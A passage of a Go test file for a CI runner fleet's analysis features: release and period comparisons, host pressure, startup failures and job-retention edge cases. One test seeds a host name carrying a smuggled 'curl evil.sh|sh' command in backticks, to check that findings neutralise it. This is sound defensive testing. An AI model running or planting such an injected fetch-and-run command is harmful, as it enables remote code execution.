		q := first.Add(time.Duration(i) * time.Minute)
		f.job("", q, func(j *store.Job) {
			ran(q.Add(time.Minute), q.Add(6*time.Minute), "success")(j)
			j.ControllerVersion = version
		})
	}
}

func samples(f *analysisFleet, host string, capacity int, minutes ...int) {
	f.t.Helper()
	var batch []store.HostSample
	for _, m := range minutes {
		batch = append(batch, store.HostSample{HostID: host, At: at(m), Capacity: capacity})
	}
	if err := f.st.RecordHostSamples(f.ctx, batch); err != nil {
		f.t.Fatal(err)
	}
}

// With no release named, the comparison is between the two that ran jobs
// last, never between a release and the jobs no release here stamped; each
// side spans its own jobs, and the fleet's size is read over that span alone.
func TestAnalyseCompareChoosesTheTwoMostRecentReleases(t *testing.T) {
	f := newAnalysisFleet(t)
	f.release("v1.3.1", at(0), 3)
	f.release("v1.3.2", at(60), 3)
	f.release("v1.3.3", at(120), 3)
	f.release("", at(200), 3)
	samples(f, "host_x", 2, 60, 61, 62)
	samples(f, "host_x", 4, 120, 121, 122)
	samples(f, "host_x", 100, 0, 200)

	got, err := f.c.AnalyseCompare(f.ctx, CompareRequest{Since: analysisPeriod.Since, Until: analysisPeriod.Until})
	if err != nil {
		t.Fatal(err)
	}
	e := got.Evidence
	if e.By != "version" || e.A.Label != "v1.3.2" || e.B.Label != "v1.3.3" {
		t.Fatalf("by %q, A %q, B %q; want version, v1.3.2 then v1.3.3", e.By, e.A.Label, e.B.Label)
	}
	if e.A.Figures.Jobs != 3 || e.B.Figures.Jobs != 3 {
		t.Errorf("jobs %d and %d, want 3 a side", e.A.Figures.Jobs, e.B.Figures.Jobs)
	}
	if !e.B.Since.Equal(at(120)) || !e.B.Until.Equal(at(123)) || !e.A.Since.Equal(at(60)) || !e.A.Until.Equal(at(63)) {
		t.Errorf("sides span %v to %v and %v to %v, want each release's own minutes", e.A.Since, e.A.Until, e.B.Since, e.B.Until)
	}
	// A release's span is where its jobs ran, not a cut: the end asked for
	// is the period's.
	if !e.A.AskedUntil.Equal(analysisPeriod.Until) || !e.B.AskedUntil.Equal(analysisPeriod.Until) {
		t.Errorf("asked to end at %v and %v, want the period's end %v", e.A.AskedUntil, e.B.AskedUntil, analysisPeriod.Until)
	}
	if e.A.MeanSlots == nil || *e.A.MeanSlots != 2 || e.B.MeanSlots == nil || *e.B.MeanSlots != 4 {
		t.Errorf("mean slots %v and %v, want 2 and 4", e.A.MeanSlots, e.B.MeanSlots)
	}
	if !slices.Equal(e.Excluded, []string{"cancelled", "skipped"}) {
		t.Errorf("excluded %v, want cancelled and skipped", e.Excluded)
	}
}

// One release is not a comparison. Pairing it with the jobs no release
// stamped, or with nothing, would read as a verdict on it; saying so leaves
// the caller to name another or compare periods.
func TestTooFewReleasesToCompareIsSaidNotGuessed(t *testing.T) {
	f := newAnalysisFleet(t)
	f.release("v1.3.3", at(120), 3)
	f.release("", at(200), 3)
	_, err := f.c.AnalyseCompare(f.ctx, CompareRequest{By: "version", Since: analysisPeriod.Since, Until: analysisPeriod.Until})
	if !errors.Is(err, ErrTooFewReleases) {
		t.Fatalf("one release: %v, want ErrTooFewReleases", err)
	}
	got, err := f.c.AnalyseCompare(f.ctx, CompareRequest{A: "v1.3.2", B: "v1.3.3", Since: analysisPeriod.Since, Until: analysisPeriod.Until})
	if err != nil || got.Evidence.A.Figures.Jobs != 0 || got.Evidence.B.Figures.Jobs != 3 {
		t.Errorf("two named releases: %+v, %v; want a finding with none on the side that ran none", got.Evidence, err)
	}
}

// retention.jobs prunes the oldest jobs, and no roll-up keeps which release
// ran a job, so the release that was running when the cut fell has lost its
// early jobs and says so; a release that began after the cut has lost none.
func TestAReleaseSideReachingPastRetentionSaysItsEarlierJobsAreGone(t *testing.T) {
	f := newAnalysisFleet(t)
	f.c.UpdateConfig(func(c *config.Config) { c.Retention.Jobs = 48 * time.Hour })
	f.release("", analysisNow.Add(-47*time.Hour-30*time.Minute), 3)
	f.release("v1.3.2", analysisNow.Add(-47*time.Hour), 3)
	f.release("v1.3.3", analysisNow.Add(-23*time.Hour), 3)
	got, err := f.c.AnalyseCompare(f.ctx, CompareRequest{Since: analysisNow.Add(-96 * time.Hour), Until: analysisNow})
	if err != nil {
		t.Fatal(err)
	}
	cut := analysisNow.Add(-48 * time.Hour)
	if a := got.Evidence.A.JobsGoneBefore; a == nil || !a.Equal(cut) {
		t.Errorf("v1.3.2's jobs gone before %v, want %v", a, cut)
	}
	if b := got.Evidence.B.JobsGoneBefore; b != nil {
		t.Errorf("v1.3.3, which began after the cut, lost jobs before %v", b)
	}
	got, err = f.c.AnalyseCompare(f.ctx, CompareRequest{Since: analysisNow.Add(-47 * time.Hour), Until: analysisNow})
	if err != nil || got.Evidence.A.JobsGoneBefore != nil {
		t.Errorf("a period inside retention: %v, %v; want nothing gone", got.Evidence.A.JobsGoneBefore, err)
	}
}

// Cancelled and skipped jobs stop when somebody says so; counted, a release
// whose users cancelled more would look faster and more reliable for it
// (spec 5.2, F2). Two sides that differ only by such jobs read the same on
// every figure, and the finding says what was left out.
func TestCompareLeavesCancelledAndSkippedOutOfEveryFigure(t *testing.T) {
	f := newAnalysisFleet(t)
	side := func(base time.Time) {
		for i, conclusion := range []string{"success", "success", "success", "failure"} {
			q := base.Add(time.Duration(i) * time.Minute)
			f.job("", q, ran(q.Add(time.Minute), q.Add(6*time.Minute), conclusion))
		}
	}
	side(analysisNow.Add(-12 * time.Hour))
	side(analysisNow.Add(-6 * time.Hour))
	for _, conclusion := range []string{"cancelled", "skipped"} {
		q := analysisNow.Add(-5 * time.Hour)
		f.job("", q, func(j *store.Job) {
			ran(q.Add(3*time.Hour), q.Add(4*time.Hour), conclusion)(j)
			j.FaultKind, j.RunnerFault = store.FaultHostLost, "the host stopped answering"
		})
	}
	got, err := f.c.AnalyseCompare(f.ctx, CompareRequest{By: "period", Since: analysisPeriod.Since, Until: analysisPeriod.Until})
	if err != nil {
		t.Fatal(err)
	}
	e := got.Evidence
	if e.A.Figures.Jobs != 4 || !reflect.DeepEqual(e.A.Figures, e.B.Figures) {
		t.Errorf("figures differ:\n A %+v\n B %+v", e.A.Figures, e.B.Figures)
	}
	if !slices.Equal(e.Excluded, []string{"cancelled", "skipped"}) {
		t.Errorf("excluded %v, want cancelled and skipped", e.Excluded)
	}
	if e.A.Label != "the 6 hours before" || e.B.Label != "the last 6 hours" {
		t.Errorf("labels %q and %q, want periods that read after \"in\"", e.A.Label, e.B.Label)
	}
}

// Past retention.jobs a period's job rows are gone, and the daily roll-up is
// what is left: counts, no percentiles, read whole days from midnight UTC. The
// side says it began where the read did, and never that its jobs are merely
// cut short, which is a release side's case (decision 5).
func TestAPeriodSidePastJobRetentionIsReadFromTheRollUp(t *testing.T) {
	f := newAnalysisFleet(t)
	f.c.UpdateConfig(func(c *config.Config) { c.Retention.Jobs = 48 * time.Hour })
	w := AnalysisWindow{Since: analysisNow.Add(-36 * time.Hour), Until: analysisNow}
	aStart := w.Since.Add(-36 * time.Hour)
	midnight := aStart.Truncate(24 * time.Hour)
	// A day before the side, so not read, and so the counts are complete
	// from the side's first midnight rather than from the fleet's first job.
	f.job("", midnight.Add(-23*time.Hour), func(j *store.Job) {
		ran(midnight.Add(-22*time.Hour), midnight.Add(-21*time.Hour), "success")(j)
		j.RunnerID = "run_older"
	})
	// Before the side's own start but on its first day, which the roll-up
	// reads whole.
	f.job("", midnight.Add(time.Hour), func(j *store.Job) {
		ran(midnight.Add(2*time.Hour), midnight.Add(3*time.Hour), "success")(j)
		j.RunnerID = "run_early"
	})
	for i := range 40 {
		q := aStart.Add(time.Duration(i) * time.Minute)
		f.job("", q, func(j *store.Job) {
			ran(q.Add(time.Minute), q.Add(5*time.Minute), "success")(j)
			j.RunnerID = fmt.Sprintf("run_a%d", i)
			if i < 2 {
				j.FaultKind, j.Conclusion = store.FaultHostLost, "failure"
			}
		})
		q = w.Since.Add(time.Duration(i) * time.Minute)
		f.job("", q, ran(q.Add(time.Minute), q.Add(5*time.Minute), "success"))
	}
	got, err := f.c.AnalyseCompare(f.ctx, CompareRequest{By: "period", Since: w.Since, Until: w.Until})
	if err != nil {
		t.Fatal(err)
	}
	a, b := got.Evidence.A, got.Evidence.B
	if !a.CountsOnly || !a.Since.Equal(midnight) || a.Figures.Jobs != 41 || a.Figures.FleetFailed != 2 {
		t.Errorf("A = counts only %v from %v, %d jobs, %d fleet failed; want the roll-up's 41 and 2 from %v",
			a.CountsOnly, a.Since, a.Figures.Jobs, a.Figures.FleetFailed, midnight)
	}
	if b.CountsOnly || b.Figures.Jobs != 40 {
		t.Errorf("B = counts only %v, %d jobs; want the job rows' 40", b.CountsOnly, b.Figures.Jobs)
	}
	if a.JobsGoneBefore != nil || b.JobsGoneBefore != nil {
		t.Errorf("a period side read as cut short by retention: %v, %v", a.JobsGoneBefore, b.JobsGoneBefore)
	}
	if !got.Evidence.PercentilesUnavailable || !strings.Contains(got.ConfidenceReason, "its percentiles are unavailable") {
		t.Errorf("percentiles unavailable %v, reason %q", got.Evidence.PercentilesUnavailable, got.ConfidenceReason)
	}
}

// Host pressure judges a minute by the throttle's own line, and by the
// host's own memory reserve, so "under pressure" means here what it means to
// the scheduler stepping the host down.
func TestHostPressureUsesTheThrottlesLoadThreshold(t *testing.T) {
	if analysis.DefaultPressure.LoadPerCPU != scheduler.LoadPerCPUOverwhelmed {
		t.Fatalf("analysis judges load at %v a core, the throttle at %v", analysis.DefaultPressure.LoadPerCPU, scheduler.LoadPerCPUOverwhelmed)
	}
	f := newAnalysisFleet(t)
	host := f.host("vm-1", "amd64")
	got, err := f.c.AnalyseHostPressure(f.ctx, analysisPeriod, host.ID)
	if err != nil {
		t.Fatal(err)
	}
	want := analysis.PressureThresholds{LoadPerCPU: scheduler.LoadPerCPUOverwhelmed, MemoryReserveMB: host.MemoryReserve()}
	if got.Evidence.Pressure != want || want.MemoryReserveMB <= 0 {
		t.Errorf("judged by %+v, want %+v", got.Evidence.Pressure, want)
	}
}

// The host's minutes and what went wrong on it: a failure is placed when it
// happened, so a job queued the evening before that failed inside the period
// is the period's (P11), and a job on another host is not this one's.
func TestAnalyseHostPressureReadsTheHostsMinutesAndWhatFailedOnIt(t *testing.T) {
	f := newAnalysisFleet(t)
	host, other := f.host("vm-1", "amd64"), f.host("vm-2", "amd64")
	w := AnalysisWindow{Since: at(0), Until: at(120)}
	var batch []store.HostSample
	for i := range 120 {
		load, avail := 4.0, int64(32*1024)
		if i < 20 {
			load = 20
		}
		batch = append(batch, store.HostSample{HostID: host.ID, At: at(i), Capacity: 4, CPUs: 8, LoadAverage1: ptr(load),
			MemoryMB: 64 * 1024, MemoryAvailableMB: ptr(avail)})
	}
	if err := f.st.RecordHostSamples(f.ctx, batch); err != nil {
		t.Fatal(err)
	}
	for i, m := range []int{1, 4, 7, 10, 13, 16, 60} {
		queued := at(m - 3)
		if i == 0 {
			queued = at(-600)
		}
		done := at(m).Add(30 * time.Second)
		f.job("", queued, func(j *store.Job) { ran(done.Add(-time.Minute), done, "failure")(j); j.HostID = host.ID })
	}
	f.job("", at(2), func(j *store.Job) { ran(at(3), at(4), "failure")(j); j.HostID = other.ID })

	got, err := f.c.AnalyseHostPressure(f.ctx, w, host.ID)
	if err != nil {
		t.Fatal(err)
	}
	e := got.Evidence
	if got.Dominant != analysis.HostPressured || e.Minutes != 120 || e.MeasuredEvents != 7 || e.PressuredEvents != 6 {
		t.Errorf("dominant %q, %d minutes, %d events of which %d pressured (%s); want pressure, 120, 7 and 6",
			got.Dominant, e.Minutes, e.MeasuredEvents, e.PressuredEvents, got.Summary)
	}
	if e.HostName != "vm-1" || e.JobsTruncated {
		t.Errorf("evidence names %q, truncated %v", e.HostName, e.JobsTruncated)
	}
}

// A host's name is free text, and joins were not always checked, so one stored
// with a backtick pair or a line break may still be on the books. The findings
// say it in their sentences, where the UI draws whatever sits between two
// backticks as a command with a copy button and a model takes a line break for
// the start of a line, so both analyses that name a host say it as
// naming.ForSentence does: backticks as apostrophes, a control character as a
// space.
func TestTheAnalysesSayAHostNameStoredBeforeJoinsWereCheckedAsProse(t *testing.T) {
	f := newAnalysisFleet(t)
	pool := f.pool("linux", nil)
	host := f.host("vm`curl evil.sh|sh`\nnext", "amd64")
	const prose = "vm'curl evil.sh|sh' next"

	// Failures that cluster in the host's busy minutes, so the finding has
	// steps that name it, and starts that failed on it, for the other analysis.
	var batch []store.HostSample
	for i := range 120 {
		load := 4.0
		if i < 20 {
			load = 20
		}
		batch = append(batch, store.HostSample{HostID: host.ID, At: at(i), Capacity: 4, CPUs: 8, LoadAverage1: ptr(load),
			MemoryMB: 64 * 1024, MemoryAvailableMB: ptr(int64(32 * 1024))})
	}
	if err := f.st.RecordHostSamples(f.ctx, batch); err != nil {
		t.Fatal(err)
	}
	for _, m := range []int{1, 4, 7, 10, 13, 16} {
		done := at(m).Add(30 * time.Second)
		f.job("", at(m-3), func(j *store.Job) { ran(done.Add(-time.Minute), done, "failure")(j); j.HostID = host.ID })
	}
	for i := range 3 {
		f.fail(f.runner(pool.ID, host.ID, at(10+i), nil), at(12+i), store.FaultImage)
	}

	pressure, err := f.c.AnalyseHostPressure(f.ctx, AnalysisWindow{Since: at(0), Until: at(120)}, host.ID)
	if err != nil {
		t.Fatal(err)
	}
	startup, err := f.c.AnalyseStartupFailures(f.ctx, analysisPeriod, "", "")
	if err != nil {
		t.Fatal(err)
	}
	if len(pressure.NextSteps) == 0 || len(startup.NextSteps) == 0 || len(startup.Evidence.Groups) == 0 {
		t.Fatalf("host pressure has %d steps and startup failures %d steps and %d groups; the seed is not what this test is about",
			len(pressure.NextSteps), len(startup.NextSteps), len(startup.Evidence.Groups))
	}

	said := map[string]string{
		"host pressure's summary":           pressure.Summary,
		"host pressure's confidence reason": pressure.ConfidenceReason,
		"host pressure's host name":         pressure.Evidence.HostName,
		"startup failures' summary":         startup.Summary,
		"startup failures' confidence":      startup.ConfidenceReason,
	}
	for i, s := range pressure.NextSteps {
		said[fmt.Sprintf("host pressure's step %d", i+1)] = s.Text
	}
	for i, s := range startup.NextSteps {
		said[fmt.Sprintf("startup failures' step %d", i+1)] = s.Text
	}
	for i, g := range startup.Evidence.Groups {
		said[fmt.Sprintf("startup failures' group %d", i+1)] = g.Name
	}
	for where, text := range said {
		if strings.ContainsAny(text, "`\n") {
			t.Errorf("%s carries the host's name as it was stored: %q", where, text)
		}
	}
	for where, text := range map[string]string{"host pressure's summary": pressure.Summary, "startup failures' summary": startup.Summary} {
		if !strings.Contains(text, prose) {
			t.Errorf("%s does not name the host as %q: %q", where, prose, text)
		}
	}
	if pressure.Evidence.HostName != prose {
		t.Errorf("host pressure's evidence names the host %q, want %q", pressure.Evidence.HostName, prose)
	}
}

// Load is per core only when the host said how many cores it has; a load
// over no cores is no measurement, not an infinite one.
func TestALoadIsPerCoreOnlyWhenTheHostReportedItsCores(t *testing.T) {
	m := hostMinute(store.HostSample{At: at(0), LoadAverage1: ptr(4.0), CPUs: 8, MemoryMB: 1024, MemoryAvailableMB: ptr(int64(512)), CPUPercent: ptr(50.0)})
	if m.LoadPerCPU == nil || *m.LoadPerCPU != 0.5 || m.MemoryMB != 1024 || *m.MemoryAvailableMB != 512 || *m.CPUPercent != 50 {
		t.Errorf("minute = %+v", m)
	}
	if m := hostMinute(store.HostSample{At: at(0), LoadAverage1: ptr(4.0)}); m.LoadPerCPU != nil {
		t.Errorf("a load over no cores reads %v", *m.LoadPerCPU)
	}
}

// A job's startup is its own runner's, from the request to the registration,
// the phase the queue-wait breakdown carves out (P11). A runner asked for
// before the job was queued was not started for it.
func TestAJobsStartupIsItsOwnRunnersRequestToRegistration(t *testing.T) {
	q := at(10)
	for name, c := range map[string]struct {
		requested, registered *time.Time
		want                  *int64
	}{
		"its own runner":          {ptr(q.Add(time.Minute)), ptr(q.Add(3 * time.Minute)), ptr(int64(120))},
		"a runner already there":  {ptr(q.Add(-time.Hour)), ptr(q.Add(-50 * time.Minute)), nil},
		"a runner that never was": {ptr(q.Add(time.Minute)), nil, nil},
		"no runner on record":     {nil, nil, nil},
	} {
		got := hostJob(store.JobWait{QueuedAt: q, RunnerRequestedAt: c.requested, RunnerRegisteredAt: c.registered})
		if (got.StartupSeconds == nil) != (c.want == nil) || (c.want != nil && *got.StartupSeconds != *c.want) {
			t.Errorf("%s: startup %v, want %v", name, got.StartupSeconds, c.want)
		}
	}
	// A fault recorded before faults had kinds is a fault all the same.
	if got := hostJob(store.JobWait{RunnerFault: "runner exited"}); got.FaultKind == "" {
		t.Error("a fault with no kind reads as no fault")
	}
}

// A start's outcome is what it was when the period ended: the store's state
// is the runner's state now (P13 and the Task 5 carries).
func TestAStartsOutcomeIsWhatItWasWhenThePeriodEnded(t *testing.T) {
	until := at(60)
	before, after := ptr(at(30)), ptr(at(90))
	for name, c := range map[string]struct {
		span store.RunnerSpan
		want string
	}{
		"failed in the period":                       {store.RunnerSpan{State: store.RunnerFailed, FaultKind: store.FaultImage, EndedAt: before}, analysis.StartFailed},
		"failed with no end on record":               {store.RunnerSpan{State: store.RunnerFailed, FaultKind: store.FaultImage}, analysis.StartFailed},
		"failed after the period, still starting":    {store.RunnerSpan{State: store.RunnerFailed, EndedAt: after}, analysis.StartUnknown},
		"failed after the period, registered in it":  {store.RunnerSpan{State: store.RunnerFailed, RegisteredAt: before, EndedAt: after}, analysis.StartStarted},
		"failed and cleaned up":                      {store.RunnerSpan{State: store.RunnerRemoved, FaultKind: store.FaultImage, EndedAt: before}, analysis.StartFailed},
		"removed before registering, nothing said":   {store.RunnerSpan{State: store.RunnerRemoved, EndedAt: before}, analysis.StartUnknown},
		"registered and removed":                     {store.RunnerSpan{State: store.RunnerRemoved, RegisteredAt: before, EndedAt: before}, analysis.StartStarted},
		"registered after the period":                {store.RunnerSpan{State: store.RunnerIdle, RegisteredAt: after}, analysis.StartUnknown},
		"still provisioning":                         {store.RunnerSpan{State: store.RunnerProvisioning}, analysis.StartUnknown},
		"a session that registered":                  {store.RunnerSpan{RegisteredAt: before, EndedAt: before}, analysis.StartStarted},
		"a session that never registered":            {store.RunnerSpan{EndedAt: before}, analysis.StartUnknown},
		"registered, then failed in the period":      {store.RunnerSpan{State: store.RunnerFailed, FaultKind: store.FaultRunnerExited, RegisteredAt: before, EndedAt: before}, analysis.StartFailed},
		"registered, then killed under a job":        {store.RunnerSpan{State: store.RunnerRemoved, FaultKind: store.FaultOutOfMemory, RegisteredAt: before, EndedAt: before}, analysis.StartStarted},
		"registered, then lost with its host":        {store.RunnerSpan{State: store.RunnerFailed, FaultKind: store.FaultHostLost, RegisteredAt: before, EndedAt: before}, analysis.StartStarted},
		"registered, then removed by force mid-job":  {store.RunnerSpan{State: store.RunnerRemoved, FaultKind: store.FaultRemoved, RegisteredAt: before, EndedAt: before}, analysis.StartStarted},
		"registered, then out of disk under its job": {store.RunnerSpan{State: store.RunnerFailed, FaultKind: store.FaultOutOfDisk, RegisteredAt: before, EndedAt: before}, analysis.StartStarted},
	} {
		if got := startOutcome(c.span, until); got != c.want {
			t.Errorf("%s: %q, want %q", name, got, c.want)
		}
	}
}

// The runners read newest request first, so a cut drops the oldest; one that
// dropped only runners asked for before the period lost no start of it.
func TestAStartupReadCutBeforeThePeriodLostNoStart(t *testing.T) {
	spans := []store.RunnerSpan{{RequestedAt: at(30)}, {RequestedAt: at(-10)}}
	if startupTruncated(spans, true, at(0)) {
		t.Error("a cut among runners asked for before the period reads as truncated")
	}
	if !startupTruncated(spans[:1], true, at(0)) {
		t.Error("a cut inside the period reads as whole")
	}
	if startupTruncated(spans[:1], false, at(0)) {
		t.Error("a whole read reads as truncated")
	}
}

// Each failure is placed when it failed, not when its runner was asked for;
// the snapshot carries the heartbeat a runtime incident is first heard on, the
// host's current incidents and its throttles; and a step that names a code
// carries the code's catalog page (F8).
func TestAnalyseStartupFailuresPlacesEachFailureWhenItFailed(t *testing.T) {
	f := newAnalysisFleet(t)
	f.c.UpdateConfig(func(c *config.Config) { c.Agent.HeartbeatInterval = 45 * time.Second })
	pool := f.pool("linux", nil)
	host := f.host("vm-b", "amd64")
	f.runner(pool.ID, host.ID, at(-30), func(r *store.Runner) { r.State, r.RegisteredAt = store.RunnerIdle, ptr(at(-29)) })
	f.runner(pool.ID, host.ID, at(4), func(r *store.Runner) { r.State, r.RegisteredAt = store.RunnerIdle, ptr(at(5)) })
	for i := range 6 {
		f.fail(f.runner(pool.ID, host.ID, at(10+5*i), nil), at(12+5*i), store.FaultImage)
	}
	if err := f.st.SetHostImagePullIncident(f.ctx, host.ID, &store.ImagePullIncident{PoolID: pool.ID, Pool: pool.Name,
		Image: pool.Image, Registry: "ghcr.io", Source: "start", Since: at(9), ObservedAt: at(40)}); err != nil {
		t.Fatal(err)
	}
	f.audit("host.throttle", host.ID, 1, at(50), "")
	// Created in the period, its request delivered after it: not a start the
	// period holds.
	f.runner(pool.ID, host.ID, at(100), func(r *store.Runner) { r.CreateTaskIssuedAt = ptr(at(400)) })

	snap, err := f.c.startupSnapshot(f.ctx, analysisPeriod, "", "")
	if err != nil {
		t.Fatal(err)
	}
	if snap.HeartbeatInterval != 45*time.Second {
		t.Errorf("heartbeat interval %v, want the configured 45s", snap.HeartbeatInterval)
	}
	if len(snap.Attempts) != 7 {
		t.Fatalf("attempts %d, want the 7 asked for in the period", len(snap.Attempts))
	}
	for _, a := range snap.Attempts {
		// A start is placed when it registered; without the stamp it would
		// be placed at its request.
		if a.Outcome == analysis.StartStarted && (a.RegisteredAt == nil || !a.RegisteredAt.Equal(at(5))) {
			t.Errorf("started attempt %+v, want its registration", a)
		}
		if a.Outcome == analysis.StartFailed && (a.EndedAt == nil || a.FaultKind != string(store.FaultImage) || a.HostName != "vm-b" || a.PoolName != pool.Name) {
			t.Errorf("failed attempt %+v, want its end, fault and names", a)
		}
	}
	if len(snap.Incidents) != 1 || snap.Incidents[0] != (analysis.HostIncident{HostID: host.ID, Kind: analysis.IncidentImagePull, PoolID: pool.ID, Since: at(9)}) {
		t.Errorf("incidents %+v", snap.Incidents)
	}
	if len(snap.Throttles) != 1 || snap.Throttles[0].HostID != host.ID || !snap.Throttles[0].From.Equal(at(50)) || !snap.Throttles[0].To.IsZero() {
		t.Errorf("throttles %+v, want one open from minute 50", snap.Throttles)
	}

	got, err := f.c.AnalyseStartupFailures(f.ctx, analysisPeriod, "", "")
	if err != nil {
		t.Fatal(err)
	}
	if got.Dominant != "host:"+host.ID || len(got.Evidence.Groups) == 0 {
		t.Fatalf("dominant %q (%s), want host %s", got.Dominant, got.Summary, host.ID)
	}
	if g := got.Evidence.Groups[0]; !g.FailingSince.Equal(at(12)) || !g.LastAt.Equal(at(37)) {
		t.Errorf("failing since %v, last %v; want when the first and last failed, not when they were asked for", g.FailingSince, g.LastAt)
	}
	coded := 0
	for _, s := range got.NextSteps {
		if s.Code == "" {
			continue
		}
		coded++
		if s.Link == "" || s.Link != catalogDocsFor(s.Code) {
			t.Errorf("step %+v carries no link to its catalog page", s)
		}
	}
	if coded == 0 {
		t.Errorf("steps %+v name no code to link", got.NextSteps)
	}
}

// The roll-up keeps whole UTC days, and the day a counts-only side ends on
// is read whole once it is rolled up. Its end is then that day's midnight,
// as its start is the midnight before it: read to the end of the day, it
// would count the jobs of the other side's first hours as well, and say it
// had not.
func TestACountsOnlySideEndsAtTheLastMidnightTheRollUpRead(t *testing.T) {
	f := newAnalysisFleet(t)
	f.c.UpdateConfig(func(c *config.Config) { c.Retention.Jobs = 48 * time.Hour })
	// 33 hours: B from 03:00 yesterday, A from 18:00 three days ago.
	w := AnalysisWindow{Since: analysisNow.Add(-33 * time.Hour), Until: analysisNow}
	day := func(d, h int) time.Time {
		return analysisNow.Truncate(24*time.Hour).AddDate(0, 0, d).Add(time.Duration(h) * time.Hour)
	}
	ranHere := func(q time.Time) {
		f.job("", q, func(j *store.Job) {
			ran(q.Add(time.Minute), q.Add(5*time.Minute), "success")(j)
			j.RunnerID = "run_" + q.Format("0102150405")
		})
	}
	ranHere(day(-4, 5)) // the fleet's first record, before A's first day
	for i := range 5 {
		ranHere(day(-2, 6).Add(time.Duration(i) * time.Minute)) // A's, on a whole day
	}
	ranHere(day(-1, 1)) // A's, after the last midnight it can read whole
	for i := range 7 {
		ranHere(day(-1, 5).Add(time.Duration(i) * time.Minute)) // B's
	}
	if _, err := f.st.RollUpInstallations(f.ctx, analysisNow, time.Time{}); err != nil {
		t.Fatal(err)
	}
	got, err := f.c.AnalyseCompare(f.ctx, CompareRequest{By: "period", Since: w.Since, Until: w.Until})
	if err != nil {
		t.Fatal(err)
	}
	a, b := got.Evidence.A, got.Evidence.B
	if !a.CountsOnly || !a.Since.Equal(day(-3, 0)) || !a.Until.Equal(day(-1, 0)) || a.Figures.Jobs != 5 {
		t.Errorf("A = counts only %v, %v to %v, %d jobs; want 5 jobs from %v to %v", a.CountsOnly, a.Since, a.Until, a.Figures.Jobs, day(-3, 0), day(-1, 0))
	}
	if b.CountsOnly || !b.Since.Equal(w.Since) || b.Figures.Jobs != 7 {
		t.Errorf("B = counts only %v from %v, %d jobs; want the job rows' 7 from %v", b.CountsOnly, b.Since, b.Figures.Jobs, w.Since)
	}
	// The counts are named for the span they cover, and the hours between
	// the two are said to be in neither.
	if want := "5 jobs ran in the 2 days before and 7 in the last 33 hours: fewer than 30 on either side, so the two are not ranked."; got.Summary != want {
		t.Errorf("summary\n got %q\nwant %q", got.Summary, want)
	}
	if want := "the jobs queued from 2026-10-11 00:00 UTC to 2026-10-11 03:00 UTC, between the two periods, are counted on neither side"; !strings.Contains(got.ConfidenceReason, want) {
		t.Errorf("reason %q does not say %q", got.ConfidenceReason, want)
	}
}

// A side under a day that ends on a midnight is read as the whole day before
// that midnight: it overlaps nothing of the other side, and its name says
// the 24 hours it covers, not the 6 asked for.
func TestASubDayCountsOnlySideEndingOnAMidnightIsTheWholeDayItRead(t *testing.T) {
	f := newAnalysisFleet(t)
	f.c.UpdateConfig(func(c *config.Config) { c.Retention.Jobs = 40 * time.Hour })
	day := func(d, h int) time.Time {
		return analysisNow.Truncate(24*time.Hour).AddDate(0, 0, d).Add(time.Duration(h) * time.Hour)
	}
	ranHere := func(q time.Time) {
		f.job("", q, func(j *store.Job) {
			ran(q.Add(time.Minute), q.Add(5*time.Minute), "success")(j)
			j.RunnerID = "run_" + q.Format("0102150405")
		})
	}
	ranHere(day(-4, 5))
	for i := range 2 {
		ranHere(day(-2, 5).Add(time.Duration(i) * time.Minute)) // before A's own start, on its day
	}
	for i := range 3 {
		ranHere(day(-2, 19).Add(time.Duration(i) * time.Minute))
	}
	ranHere(day(-1, 2)) // B's
	if _, err := f.st.RollUpInstallations(f.ctx, analysisNow, time.Time{}); err != nil {
		t.Fatal(err)
	}
	got, err := f.c.AnalyseCompare(f.ctx, CompareRequest{By: "period", Since: day(-1, 0), Until: day(-1, 6)})
	if err != nil {
		t.Fatal(err)
	}
	a, b := got.Evidence.A, got.Evidence.B
	if !a.CountsOnly || !a.Since.Equal(day(-2, 0)) || !a.Until.Equal(day(-1, 0)) || a.Figures.Jobs != 5 || a.Label != "the 24 hours before" {
		t.Errorf("A = %q, counts only %v, %v to %v, %d jobs; want the 24 hours before, its 5 jobs, %v to %v",
			a.Label, a.CountsOnly, a.Since, a.Until, a.Figures.Jobs, day(-2, 0), day(-1, 0))
	}
	if b.Label != "the 6 hours to 2026-10-11 06:00 UTC" || b.Figures.Jobs != 1 {
		t.Errorf("B = %q, %d jobs", b.Label, b.Figures.Jobs)
	}
	if strings.Contains(got.ConfidenceReason, "neither side") {
		t.Errorf("sides that meet are said to leave hours out: %q", got.ConfidenceReason)
	}
}

// A side under a day that ends off a midnight has no midnight inside it to
// end on: the roll-up would read its whole day, the other side's hours
// included, or nothing. It is refused with what to change.
func TestASubDayCountsOnlySideEndingOffAMidnightIsRefused(t *testing.T) {
	f := newAnalysisFleet(t)
	f.c.UpdateConfig(func(c *config.Config) { c.Retention.Jobs = 30 * time.Hour })
	day := func(d, h int) time.Time {
		return analysisNow.Truncate(24*time.Hour).AddDate(0, 0, d).Add(time.Duration(h) * time.Hour)
	}
	for _, h := range []int{3, 10} {
		q := day(-1, h)
		f.job("", q, func(j *store.Job) {
			ran(q.Add(time.Minute), q.Add(5*time.Minute), "success")(j)
			j.RunnerID = "run_" + q.Format("0102150405")
		})
	}
	if _, err := f.st.RollUpInstallations(f.ctx, analysisNow, time.Time{}); err != nil {
		t.Fatal(err)
	}
	// The advice has to work for the period refused: a period that is itself
	// past retention.jobs can only be read as whole days, so halving it is
	// advice for a period ending now, and says so.
	for name, c := range map[string]struct {
		w    AnalysisWindow
		side string
	}{
		"inside the day":           {AnalysisWindow{Since: day(-1, 8), Until: day(-1, 14)}, "2026-10-11 02:00 UTC to 2026-10-11 08:00 UTC"},
		"starting on its midnight": {AnalysisWindow{Since: day(-1, 6), Until: day(-1, 12)}, "2026-10-11 00:00 UTC to 2026-10-11 06:00 UTC"},
	} {
		_, err := f.c.AnalyseCompare(f.ctx, CompareRequest{By: "period", Since: c.w.Since, Until: c.w.Until})
		if !errors.Is(err, ErrWholeDaysOnly) {
			t.Errorf("%s: %v, want ErrWholeDaysOnly", name, err)
			continue
		}
		want := "the earlier period, " + c.side + ", is older than retention.jobs, so it can only be read in whole UTC days from the usage roll-up, " +
			"and it has no midnight inside it to end on; choose a period of at least a whole day, or, for a period ending now, one no longer than half of retention.jobs"
		if err.Error() != want {
			t.Errorf("%s: error\n got %q\nwant %q", name, err, want)
		}
	}
}

// With only B named, A is the release before it, so a change reads in the
// direction time ran; a release with none before it, or the same release
// on both sides, is refused with what to change.
func TestOnlyBNamedIsComparedWithTheReleaseBeforeIt(t *testing.T) {
	f := newAnalysisFleet(t)
	f.release("v1.3.1", at(0), 3)
